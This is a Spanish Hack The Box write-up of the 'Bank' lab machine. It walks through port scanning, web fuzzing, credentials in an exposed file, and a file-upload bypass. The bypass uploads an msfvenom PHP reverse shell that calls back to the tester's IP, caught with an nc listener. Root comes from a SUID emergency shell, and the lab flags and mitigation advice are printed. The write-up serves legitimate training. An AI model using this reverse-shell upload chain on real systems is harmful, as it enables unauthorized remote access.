---
titulo: "Bank"
fecha: 2026-11-01
plataforma: htb
so: linux
dificultad: Fácil
estado: publicado
tecnicas: [dns, vhosts, enumeracion-web, carga-de-archivos, suid]
herramientas: [nmap, ffuf, msfvenom, nc, ltrace]
htb: "https://app.hackthebox.com/machines/Bank"
---

# Bank

[![Icono de la máquina Bank en Hack The Box](capturas/bank-icono.png){ .maquina-icono }](https://app.hackthebox.com/machines/Bank)

## Resumen

Máquina Linux que simula el portal de un banco. Enumerando los *virtual hosts* aparece
`bank.htb`, y en `/balance-transfer` hay una cuenta con un fichero anómalo que contiene
unas credenciales. Dentro del panel se puede subir una *web shell* aprovechando que la
aplicación ejecuta como PHP los ficheros con extensión `.htb` (dejado en un comentario de
*debug*), lo que da acceso como `www-data` y la flag de usuario. La escalada a root es
inmediata: un binario **SUID** (`emergency`) abre una shell de root.

## Reconocimiento

Ping para ver el TTL y el sistema operativo:

```
64 bytes from 10.129.29.200: icmp_seq=1 ttl=63 time=53.7 ms
```

Por el TTL (cercano a 64) es una máquina Linux.

## Enumeración

### Puertos y servicios

```
nmap -p- --open -T4 --min-rate 5000 -Pn 10.129.29.200
```

```
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

Detallamos:

```
nmap -p 80,53,22 -sVC -T4 --min-rate 5000 -Pn 10.129.29.200
```

```
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

Apache 2.4.7 e ISC BIND son versiones antiguas. El `--script vuln` solo reporta un DoS (no
nos sirve para ganar acceso) y el escaneo UDP confirma el DNS (53/udp). Seguimos por la web.

### DNS y virtual hosts

El servicio DNS sugiere el dominio **`bank.htb`**. Lo añadimos a `/etc/hosts` y fuzzeamos
los *virtual hosts*:

```
ffuf -u http://bank.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.html,.txt -ac
```

```
login.php       [Status: 200]
support.php     [Status: 302]
index.php       [Status: 302]
inc/  uploads/  assets/
balance-transfer/
```

En **`/balance-transfer/`** hay muchísimas cuentas. La interesante es la que destaca por
tamaño: `68576f20e9732f1b2edc4df5b8533230.acc` pesa **257 bytes** (las demás rondan los 500).
Dentro hay un **usuario y una contraseña**; con ellas entramos en `/login.php` a la cuenta
del banco.

## Explotación

El panel permite subir ficheros, pero en teoría solo imágenes. Sin embargo, en `support.php`
hay un comentario de *debug* revelador:

```html
<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
```

Es decir, los ficheros `.htb` se ejecutan como **PHP**. Creamos una *web shell* con esa
extensión:

```
msfvenom -p php/reverse_php LHOST=10.10.16.120 LPORT=4444 -f raw -o shell.htb
```

La subimos, ponemos a escuchar `nc -lvnp 4444` y, al recargar la página, recibimos la shell
como `www-data`. La estabilizamos:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

En `/home/chris` leemos la primera flag:

```
cat /home/chris/user.txt
```

```
USER FLAG -> 46ced01e69aeeb320c60e3e3d82bd799
```

## Escalada de privilegios

Lo primero que reviso son los binarios **SUID** (se ejecutan con los permisos de su
propietario, normalmente root). Hay uno sospechoso:

```
find / -perm -4000 -type f 2>/dev/null
# ...
/var/htb/bin/emergency
```

Analizándolo con `ltrace` se ve que es una **shell de emergencia que se ejecuta como root**.
Basta con ejecutarla para tener privilegios de root:

```
/var/htb/bin/emergency
cd /root && cat root.txt
```

```
ROOT FLAG -> c22bb0bb7da27a1da397567e43435478
```

## Mitigación

- **No dejar ficheros sensibles accesibles** en el servidor web: el directorio
  `/balance-transfer/` exponía cuentas y credenciales sin autenticación.
- **Validar de verdad las subidas de ficheros**: comprobar el tipo real, no fiarse de la
  extensión, y nunca ejecutar como PHP extensiones «ocultas» como `.htb`. Eliminar los
  comentarios y rutas de *debug* en producción.
- **Revisar los binarios SUID**: una «shell de emergencia» SUID de root es una puerta
  trasera; no debería existir, y menos ejecutable por cualquier usuario.
- Mantener Apache, BIND y SSH **actualizados**.

## Qué he aprendido

- Enumerar los **virtual hosts** (no solo directorios) es clave: `bank.htb` abría toda la
  aplicación.
- Un detalle fuera de lo normal (un fichero de 257 bytes entre cientos de 500) suele ser la
  pista; conviene fijarse en lo que «no encaja».
- Los comentarios de *debug* son oro: aquí regalaban el *bypass* de la subida de ficheros.
- Un binario SUID mal puesto convierte la escalada en un solo comando.
